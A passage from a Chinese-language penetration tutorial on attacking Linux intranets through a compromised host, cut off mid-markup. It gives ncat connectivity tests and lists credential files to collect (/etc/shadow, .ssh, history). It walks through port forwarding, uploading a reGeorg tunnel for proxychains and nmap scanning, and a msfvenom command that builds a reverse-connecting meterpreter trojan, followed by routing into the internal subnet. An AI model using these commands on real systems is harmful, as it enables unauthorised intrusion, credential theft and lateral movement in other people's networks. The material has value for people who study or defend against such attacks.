rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;">反向连接测试</h5><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">我们在测试端口访问限制时，首先可以利用ncat在攻击机上监听一个端口。</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">ncat -l -p 9999</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">然后利用ncat或者telnet等工具在肉鸡上尝试连接，我称之为反向连接测试。</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">ncat 110.xx.xx.xx 9999</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">注：监听的端口可以随机选取，尽量选取多个端口尝试多次；如果肉鸡能够访问攻击机的任何端口，说明目标网络边界没有对出方向的连接做限制，了解这方面的信息对后面的端口转发有很大好处。</p><h5 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;">正向连接测试</h5><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">我们也可以在肉鸡上监听一个端口，攻击机上尝试连接（这里连接的是肉鸡的外网ip地址，肉鸡对外开放的web应用肯定是以一个外网ip或者域名的形式存在，而该ip在本次测试中并不是肉鸡真正的ip地址，是目标边界网络设备的ip，原理是通过端口映射将网络设备（外网ip）上的web端口映射到了肉鸡（内网ip）的web端口上），我称之为正向连接测试。</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">尝试连接肉鸡外网地址的端口，意义在于有些粗心的管理员会在网络设备上设置全端口映射，也就是说肉鸡上监听任何端口都能映射到网络边界设备的相同端口上，那么这跟肉鸡服务器直接处在外网就没差了。</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><strong><span style="font-size:18px;line-height:38px;;color: rgb(0, 122, 170);">收集服务器信息</span></strong></h3><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">收集信息可以说是渗透测试的第一步，内网渗透也一样，收集的服务器信息越多，渗透的成功率就越大。</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:16px;line-height:36px;;">查看系统内核</span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">linux系统上查看内核版本如下：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">lsb_release –a</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">一般系统的入侵途径是先提权，而提权可以通过linux内核漏洞进行，因此可以先查看linux内核版本，然后根据内核寻找exp的网站，上传exp进行提权。由于本次测试不涉及提权部分，因此不做测试，另外补充一句：内核提权有宕机风险，请谨慎操作。</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:16px;line-height:36px;;">查看操作系统位数</span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">linux系统上查看位数如下：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">getconf LONG_BIT</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">说明：知道系统是32位还是64位对后期生成msf木马有帮助。</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:16px;line-height:36px;;">系统敏感信息</span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">收集一些系统相关的敏感信息，比如账号密码、日志、历史命令、ssh文件等。</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">/etc/shadow
/etc/passwd
/var/log
history
.ssh
......</code></pre><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:16px;line-height:36px;;">web敏感信息</span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">如果服务器存在web应用，可以查看web目录下是否存在敏感信息，比如连接数据库的配置文件等等。</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="color: rgb(0, 122, 170);"><strong><span style="font-size:18px;line-height:38px;;">内网扫描</span></strong></span></h3><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">当信息收集完成后，可以尝试扫描一下内网的机器，比如主机存活扫描、端口扫描、arp扫描等。端口扫描可以使用nmap、msf等工具，但如果服务器上没有安装这些工具时，通常有3种手段可以达到内网端口扫描的效果。第一种就是服务器上安装扫描工具，这里不多说也不推荐，因为动静大且麻烦；第二种就是端口转发，将服务器内网端口转发到外网进行扫描；第三种就是代理扫描，也就是把装有扫描工具的攻击机代理到目标内网环境。</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">无论是端口转发扫描还是代理扫描，原理都是打通攻击机（外网）与肉鸡（内网）的连通性，即让攻击机可以直接访问到肉鸡所在的内网资源。这里的连接不借助于目标网络边界设备的端口映射功能，因此与攻击机访问肉鸡web服务所产生的连接有所区别。</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:16px;line-height:36px;;">端口转发</span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">想要达到以上所介绍的彼此”直接”的连接，我们需要一个中间的桥梁，来传递内外网（攻击机与肉鸡）之间的数据。搭建这种桥梁的方式有很多，我们首先可以想到端口转发，即把肉鸡服务器上的某个端口转发到攻击机的某个端口上，这样攻击机上访问本机某个端口，就相当于访问了肉鸡服务器上的某个端口。</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">端口转发的工具：lcx、meterpreter等，具体用法后面会介绍<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />端口转发类型：tcp端口转发、http转发、ssh转发等</p><h5 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;">tcp端口转发</h5><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">本机转发：攻击机上监听2222、3333端口，肉鸡上连接攻击机的2222端口，并转发肉鸡22端口。<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />转发连接原理：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">肉鸡22端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;攻击机上2222高端口&lt;--&gt;攻击机随机高端口&lt;--&gt;攻击机3333端口</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">注：此时我们去连接攻击机的3333端口，就相当于连接了肉鸡的22端口。</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">远程转发：攻击机上监听2222、3333端口，肉鸡上连接攻击机的2222端口，并转发内网目标服务器的22端口。（前提是肉鸡能够连接目标服务器的22端口）<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />转发连接原理：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">内网目标服务器22端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;攻击机上2222高端口&lt;--&gt;攻击机随机高端口&lt;--&gt;攻击机3333端口</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">注：此时我们去连接攻击机的3333端口，就相当于连接了目标服务器的22端口。</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">说明：从上面的连接过程不难看出，端口转发比较难以防范的原因就在于，攻击机上监听的端口是随机的，不可预知的，因此不可能事先在堡垒机或者防火墙上做出方向的端口策略，除非禁止服务器访问外部所有端口（现实情况大多只对进方向的端口连接做限制）。</p><h5 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;">http转发</h5><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">有些安全意思强的管理员，会对一些服务器做禁止访问外网的策略，即服务器禁止连接任何外网的端口。此时普通的tcp端口转发就没有效果了，因为转发的前提是要能互相连接上。此种情况，可以使用http转发。<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />转发连接原理：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">肉鸡web端口(80)&lt;--&gt;网络边界设备端口(80)&lt;--&gt;攻击机随机端口</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">注：这里之所以能够连通，是借助了服务器上的web服务，以及网络边界设备的映射功能。</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">说明：虽然肉鸡不能访问外网任何端口，但只要它对外提供web服务，就说明它还能跟外界通信，只不过这种通信局限于web服务端口中，并且肉鸡不是直接跟攻击机通信，而是借助了边界设备。</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="color: rgb(0, 122, 170);"><strong><span style="font-size:18px;line-height:38px;;">代理扫描内网</span></strong></span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">以上介绍了几种端口转发的使用以及原理，从中我们不难看出端口转发固然厉害，但也很局限，因为每次都只能转发一个ip的一个端口，对于扫描来说，并不是最好的选择方案。因此出现了一种更好的技术方案–代理扫描，其原理与端口转发差不多，都是需要搭建一个桥梁，而这个桥梁往往不是某个端口，而是shell或者说session。</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">代理扫描同样可以分为tcp代理扫描、http代理扫描。</p><h5 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;">http代理转发</h5><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">如果目标服务器有web系统，可以使用Regeorg + proxychains。<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />工具下载：reGeorg、proxychains<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />将reGeorg的tunnel文件上传到肉鸡服务器到网站目录下，攻击机执行：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">python reGeorgSocksProxy.py -p 2333 -u http://test.com/tunnel.php</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">然后修改proxychains.conf 配置文件</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">vim /etc/proxychains.conf &nbsp; （mac上在~/.proxychains/proxychains.conf ,没有则自己创建）</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">在最后一行添加socks5 127.0.0.1 2333(与regeorg设置的端口相同)</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">最后在攻击机使用扫描工具时，可以在执行的命令前加proxhchains4, 比如：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">proxychains4 nmap -sT -Pn -n 192.168.16.0/24</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">注：此方案适合攻击者与肉鸡服务器都在各自内网环境，攻击者可以访问到目标服务器的http服务，通过该http服务进行代理转发（速度较慢）.</p><h5 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;">tcp代理转发</h5><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">思路：通过metasploit木马反弹一个肉鸡的meterpreter shell到攻击机上，然后在meterpreter shell上设置路由，我们便可以在攻击机上直接扫描肉鸡所在的网段服务器（这里是可以跨网段扫描的）。</p><h6 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1em;max-width: 100%;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(119, 119, 119);box-sizing: border-box !important;word-wrap: break-word !important;">生成msf木马</h6><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">生成木马：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=8000 -f elf &gt; shell_8000.elf</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">由于攻击机无法访问肉鸡的端口，而肉鸡可以访问攻击机的端口，因此生成一个反向的木马。</p><h6 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1em;max-width: 100%;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(119, 119, 119);box-sizing: border-box !important;word-wrap: break-word !important;">反弹shell</h6><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">攻击机运行msfconsole，使用exoloit/multi/handler模块，set payload linux/x86/meterpreter/reverse_tcp跟生成木马时用的payload一样。LPORT设置成木马将要连接的端口，运行后会在攻击机上监听一个端口，等待木马链接。</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">此时将shell_8000.elf上传到肉鸡服务器上，添加权限后运行木马将会主动连接上攻击机监听的端口，并在攻击机上获取一个meterpreter shell。</p><h6 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1em;max-width: 100%;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(119, 119, 119);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="color: rgb(0, 0, 0);">设置路由</span></h6><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">上一步获取到了一个session，这个session是攻击机与肉鸡相互连接的会话。<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />查看下肉鸡的网络情况：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">run get_local_subnets</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;"><img class="" data-ratio="0.13306451612903225" data-type="png" data-w="1240" src="图片/HACK学习呀_2018-09-25_Linux内网渗透/2_PNAELUmrt5q0zAtzTIuT57hlEwJ7hg.png" onerror="this.src='http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIqvY59wYrysj4lfJAY2vXwpS1frxU75Iibh68Nyf2UZwBq1ibPNAELUmrt5q0zAtzTIuT57hlEwJ7hg/640?wx_fmt=png'" style="box-sizing: border-box !important;word-wrap: break-word !important;width: auto !important;visibility: visible !important;"  /><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />添加路由：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">run autoroute -s 192.168.16.0/24</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">查看路由：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: 